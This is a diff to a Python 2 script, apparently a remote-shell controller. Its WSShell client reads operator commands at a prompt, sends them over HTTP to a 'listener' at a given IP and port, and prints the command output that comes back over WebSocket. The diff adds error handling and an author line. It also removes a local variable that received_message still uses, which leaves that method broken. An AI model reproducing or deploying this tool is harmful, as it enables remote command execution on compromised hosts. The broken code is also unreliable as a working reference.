@@ -1,21 +1,29 @@
 #!/usr/bin/env python
-
+# -*- coding: utf-8 -*-
 import urllib
 import optparse
+import sys
 from ws4py.client.threadedclient import WebSocketClient
+
+__author__ = "f47h3r - Chase Schultz"
 
 class runTime():
     
     def sendCommand(self,url,message,group='boxes'):
         params = urllib.urlencode({'message': message, 'group':group})
-        f = urllib.urlopen(url, params)
-        data= f.read()
+        try:
+            f = urllib.urlopen(url, params)
+        except IOError:
+            raise IOError('Connection To Listener Terminated. Exiting.')
+            sys.exit(1)
+        f.read()
         f.close()
-        return data
+        pass
 
 class WSShell(WebSocketClient):
     ip = ''
     port = ''
+    runner = runTime();
 
     def opened(self):
         runner = runTime();
@@ -28,7 +36,6 @@ class WSShell(WebSocketClient):
 
     def received_message(self, cmd):
         print "Command Output:\n%s \n\n Total Length: %d\n\n" % (str(cmd), len(cmd))
-        runner = runTime();
         message = raw_input('>')
         runner.sendCommand("http://"+self.ip+":"+self.port, message)
 
